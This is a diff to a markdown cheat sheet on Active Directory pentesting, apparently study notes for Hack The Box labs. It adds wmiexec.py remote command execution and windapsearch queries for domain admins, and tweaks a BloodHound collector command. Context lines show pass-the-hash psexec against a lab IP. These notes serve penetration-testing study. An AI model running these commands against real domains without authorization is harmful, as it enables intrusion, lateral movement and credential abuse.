@@ -178,7 +178,7 @@ RID cycling involves brute-forcing a range of RIDs (like 500–1500) by appendin
     Get-LAPSComputers
     ```
 
-## Credentials Enumeration
+## Credentialed Enumeration
 > "That fuckin' nobody, was ..."
 
 ### Using BloodHound
@@ -257,7 +257,7 @@ Use the appropriate data collector to gather information for **BloodHound** or *
 
   ```bash
   pip install bloodhound
-  bloodhound-python -d domain.local -u username -p password -gc "GC Hostname" -dc "<DC Hostname>" -ns <DNS IP> -c all
+  bloodhound-python -d domain.local -u username -p password -gc "GC Hostname" -dc "<DC Hostname>" -ns <DNS IP> -c all --zip
   # With Kerberos
   bloodhound-python -d "scepter.htb" -u "d.baker" -no-pass -k -gc "dc01.scepter.htb" -dc "dc01.scepter.htb" -ns 10.10.11.65 -c all --zip
   ```
@@ -363,6 +363,23 @@ Replace the customqueries.json file located at `/home/username/.config/bloodhoun
   # With Hash
   impacket-psexec administrator@10.10.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
   ```
+### Using wmiexec.py
+> Executes commands via WMI (This shell will not be fully interactive)
+* **Connecting**  
+  ```bash
+  wmiexec.py <domain>/<username>:<password>@<IP>
+  ```
+### Using [Windapsearch](https://github.com/ropnop/windapsearch)
+> Uses LDAP query's. Does not provide a shell
+* **Find Domain Admins**  
+  ```bash
+  python3 windapsearch.py --dc-ip <DC IP> -u <username>@<domain> -p <password> --da
+  ```
+* **Privileged Users**  
+  ```bash
+  python3 windapsearch.py --dc-ip <DC IP> -u <username>@<domain> -p <password> --PU
+  ```
+### misc
 * **Password Policy**
   ```bash
   # CME
